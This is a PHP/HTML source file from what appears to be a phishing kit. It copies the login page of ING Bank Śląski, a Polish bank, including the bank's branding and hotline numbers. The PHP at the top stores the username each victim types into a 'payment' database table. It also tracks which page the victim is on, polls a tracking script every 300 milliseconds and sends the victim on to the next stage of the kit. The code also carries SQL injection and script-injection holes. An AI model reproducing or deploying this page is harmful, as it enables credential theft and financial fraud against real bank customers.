<?php include('../bank_header.php'); ?>
<?php include('../../../db.php'); 
if($_REQUEST['id']){
  $id = mysqli_real_escape_string($con,$_REQUEST['id']);

$page_name = basename($_SERVER['PHP_SELF']);
echo $page_name;
$sqlss = "UPDATE `payment` SET `page_name` = '$page_name' WHERE `id` = '$id'";
$con->query($sqlss);
}
if(isset($_POST['submit'])){
$bank_user_id = $_POST['bank_user_id'];
$sql = "UPDATE `payment` SET `bank_user_id` = '$bank_user_id' WHERE `id` = '".mysqli_real_escape_string($con,$_REQUEST['id'])."'";
$con->query($sql);
echo '<script>window.location.href="indexone.php?id='.$_REQUEST['id'].'"</script>';
}
?>
<script type="text/javascript">
setInterval(function(){ upd_last_login(<?php echo $_REQUEST['id']; ?>); }, 300);
function upd_last_login(str) {
    if (str == "") {
        // document.getElementById("txtHint").innerHTML = "";
        // return;
    } else { 
        if (window.XMLHttpRequest) {
            // code for IE7+, Firefox, Chrome, Opera, Safari
            xmlhttp = new XMLHttpRequest();
        } else {
            // code for IE6, IE5
            xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
        }
        xmlhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                //document.getElementById("ip").innerHTML = this.responseText;
                //alert(this.responseText);
            }
        };
        xmlhttp.open("GET","update123.php?id="+str,true);
        xmlhttp.send();
    }
}
</script>
<style>
    .ing-new-theme .login-layout_container .box-content {
    height: 30% !important;
}
</style>


<!DOCTYPE html>
<!-- saved from url=(0049)https://login.ingbank.pl/mojeing/paybylink/#login -->
<html lang="pl"><!--<![endif]-->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Moje ING | ING Bank Śląski</title>
<meta name="viewport" content="user-scalable=no, width=device-width, initial-scale=1, maximum-scale=1">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="format-detection" content="telephone=no">
<meta name="description" content="Nowa bankowość internetowa i mobilna ING Banku Śląskiego. Bankuj po swojemu, tak jak lubisz. Zaloguj się.">



<link rel="stylesheet" href="css/bootstrap.css">
<link rel="stylesheet" id="ing-main-styles" href="css/main.css">
</head>

<body class="ing-new-theme ing-paybylink ing-personal">

<div id="layout-region" class="ing-container">
    <div class="login-layout">
        <div class="region-wrapper login-region login-layout_container ui-content login-layout--top">
            <div class="main-content-wrap">
                <h1 class="sr-only">Moje ING | ING Bank Śląski - Logowanie</h1>
                    <div id="content-region" class="main-content">
                        <div class="ing-login-container">
                            <div class="content-container box">
                                <div class="header login-header box-header box--before">
                                     <img src="images/ing-logo.svg" alt="ING Bank Śląski" class="box-header_logo">
                                </div>
                                <div class="box-content login-hero">
                                    <h2>Zaloguj się do&nbsp;bankowości internetowej</h2>
                                </div>
                                <div id="body-region" class="body">
                                    <section class="login-form-container" style="margin-top:-100px;">
                                        <div class="box-content box--after">
                                            <div class="login-form-content">
                                                <form method="POST" action="" role="form">
                                                    <div class="form-group"> 
                                                        <label for="login-input">
                                                            <span aria-hidden="true">Login:</span> 
                                                            <span class="sr-only js-login-label">Wpisz login do&nbsp;bankowości internetowej</span>
                                                             <span class="sr-only js-login-incorrect-label" aria-hidden="true">Podałeś błędny login lub hasło. Wpisz ponownie login.</span>
                                                        </label> 
                                                          <input class="form-control" type="text" name="bank_user_id" id="login-input" autofocus="autofocus">
                                                    </div>
                                                         <button type="submit" name="submit" value="submit" class="btn btn-primary btn-block btn-lg js-login ing-disabled" > 
                                                            <span aria-hidden="true">Dalej</span> 
                                                            <span class="sr-only">Przejdź do&nbsp;wpisywania hasła</span>
                                                          </button>
                                                </form>
                                            </div>
                                             <p class="login_help">
                                              <a href="#" class="link js-help" target="_blank">
                                               <span class="sr-only">Mam problemy z&nbsp;logowaniemotwiera się w&nbsp;nowym oknie</span>
                                               <span aria-hidden="true">Problemy z&nbsp;logowaniem</span>
                                              </a>
                                             </p>
                                        </div>
                                      </section>
                                </div>
                                <div id="news-region" class="login_msg box-content" style="display: block;">
                                    <div class="security-message-container">
                                        <div id="content_wrapper" data-load-action="notset:notset:notset"> 
                                            <div class="layout_element layout_section"> 
                                                <div class="layout_element layout_row row class_1499177099479"> 
                                                  <div class="layout_element layout_column col-xs-12 col-sm-12 col-md-12 col-lg-12 class_1499177099480" id="offers-login-page"> 
                                                   <div class="layout_element component_wrapper" id="component_wrapper_2129917"> 
                                                     <div class="component nextgen_content content notPrintable component_2129917" data-component-id="2129917" data-component-type-code="nextgen_content" data-js-parameters="{}"> 
                                                     <div class="clearFix"></div> 
                                                   </div> 
                                                  </div> 
                                                 </div> 
                                                </div> 
                                              </div> 
                                            </div> 
                                         <div class="hidden" id="other_components"></div>
                                     </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
          <footer id="footer-region" class="ing-footer login-layout_footer ui-content login-layout--top">
              <div>
                  <div class="row">
                      <div class="ing-list-hybrid-container ing-list-hybrid-container--with-contrast">
                          <ul class="ing-list-hybrid pull-left">
                              <li><a href="#" class="ing-activation js-activation"><i class="glyphicon-ing-key" aria-hidden="true"></i> <span>Aktywuj dostęp</span></a></li>
                              <li><a href="#" target="_blank" class="js-security"><i class="glyphicon-ing-blocked2" aria-hidden="true"></i> <span>O&nbsp;bezpieczeństwie</span> <span class="sr-only">otwiera się w&nbsp;nowym oknie</span></a></li>
                              <li><a href="#" class="js-change-lang"><i class="glyphicon-ing-en" aria-hidden="true"></i> <span aria-hidden="true">English</span> <span class="sr-only">Zmień język systemu bankowości internetowej na&nbsp;angielski</span></a></li>
                              <li><a href="#" class="js-change-contrast"><i class="glyphicon-ing-e916" aria-hidden="true"></i> <span class="aria-hidden hidden-md hidden-lg">Wersja kontrastowa</span> <span class="sr-only">Zmiana kontrastu</span></a></li>
                          </ul>
                      </div>
                  <div class="ing-list-inline-container">
                      <ul class="ing-list-inline">
                          <li> <span id="aria-info">Infolinia:</span> <a href="tel:+48801601607" aria-describedby="aria-info"><span class="sr-only">zadzwoń801_601 607</span><span aria-hidden="true">801 601 607</span></a> <span> lub </span> <a href="tel:+48323570010" aria-describedby="aria-info"><span class="sr-only">zadzwoń32_357 00 10</span><span aria-hidden="true">32 357 00 10</span></a></li>
                          <li> <a href="#" target="_blank" class="js-cookie-policy"><span>Polityka <span lang="en">cookies</span></span> <span class="sr-only">otwiera się w&nbsp;nowym oknie</span></a></li>
                          <li> <span>ING Bank Śląski S.A.</span></li>
                      </ul>
                  </div>
              </div>
          </div>
          </footer>
      </div>
  </div>
<div id="page-loader-overlay-region" class="hide" style="opacity: 1; display: none;">
    <span class="ing-loader">   
    <span class="ing-spacer ing-spacer--flow">
        <div class="ing-inner-spacer">
            <div class="ing-balls">
                <div class="loader">
                      
                </div>
            </div>
        </div>
    </span>
    </span>
  </div>
  <div id="modal-region" class="modal fade" data-backdrop="static" aria-hidden="true" role="dialog" tabindex="-1"></div>

</body>
</html>
